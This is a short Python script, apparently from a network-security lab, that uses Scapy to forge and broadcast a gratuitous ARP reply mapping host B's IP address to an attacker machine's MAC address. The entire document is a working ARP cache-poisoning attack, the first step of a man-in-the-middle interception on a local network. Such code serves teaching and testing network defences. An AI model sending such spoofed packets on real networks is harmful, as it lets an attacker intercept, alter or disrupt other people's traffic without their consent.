from scapy.all import *

hostA_MAC = "02:42:0a:09:00:05"
hostB_MAC = "02:42:0a:09:00:06"
hostM_MAC = "02:42:0a:09:00:69"
hostB_IP = "10.9.0.6"
hostA_IP = "10.9.0.5"

ePkt = Ether(src=hostM_MAC, dst="ff:ff:ff:ff:ff:ff")
aPkt = ARP(hwsrc=hostM_MAC, psrc=hostB_IP, pdst=hostB_IP, hwdst="ff:ff:ff:ff:ff:ff")
aPkt.op = 2 # 1 for ARP Request; 2 for ARP Reply

pkt = ePkt/aPkt

print("Sending the following gratuitous ARP packet:")
pkt.show()

sendp(pkt)
print("Gratuitous ARP sent successfully!")

